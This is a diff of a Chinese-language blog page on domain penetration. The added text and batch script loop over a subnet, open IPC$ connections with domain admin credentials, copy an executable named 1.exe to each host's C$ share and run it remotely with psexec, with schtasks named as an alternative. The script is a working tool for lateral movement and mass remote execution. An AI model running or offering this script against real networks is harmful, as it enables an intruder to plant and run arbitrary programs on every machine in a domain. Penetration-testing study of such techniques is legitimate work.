@@ -245,10 +245,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="内网-域环境内-ipc批量上传执行"><a href="#内网-域环境内-ipc批量上传执行" class="headerlink" title="内网(域环境内)ipc批量上传执行"></a>内网(域环境内)ipc批量上传执行</h1><p><strong>在域渗透拿到域管理的情况下结合​<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools" target="_blank" rel="noopener">pstools</a>中的psexec</strong></p>
+        <p><strong><em>最近在学习域渗透时接触到ipc，批量copy和执行</em></strong></p>
+<p><strong>在域渗透拿到域管理的情况下结合​<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools" target="_blank" rel="noopener">pstools</a>中的psexec</strong></p>
 <p><strong>设置ip前三位 例如192.168.1，开始从1-225 建立ipc连接–&gt;复制文件–&gt;psexec远程执行命令</strong></p>
 <p><strong>更多域渗透中ipc命令的技巧参考twi1ight大神的文章 <a href="http://twi1ight.com/2016/04/basics-of-active-directory-hacking/" target="_blank" rel="noopener">域渗透前置基础知识</a></strong><br><img src="https://i.imgur.com/BYNeIED.jpg" alt="使用"><br>ps:psexec在少数情况下会出现服务没删除成功的bug<br>,可用schtasks替换psexec</p>
-
+<pre><code>@echo off&amp;loding...&amp;color a&amp;mode con: cols=60 lines=22
+setlocal enabledelayedexpansion
+set ipq=10.1.1
+set /a ip1=1
+set /a ip2=255
+set /a con=0
+set /a contotal=%ip2%-%ip1%+1
+for /l %%i in (!ip1!,1,!ip2!) do (
+set ip=!ipq!.%%i
+echo sacn !ip!
+net use \\!ip! password /user:domain\user
+copy 1.exe \\!ip!\C$\
+psexec \\!ip! c:\1.exe
+)
+</code></pre>
       
 
       
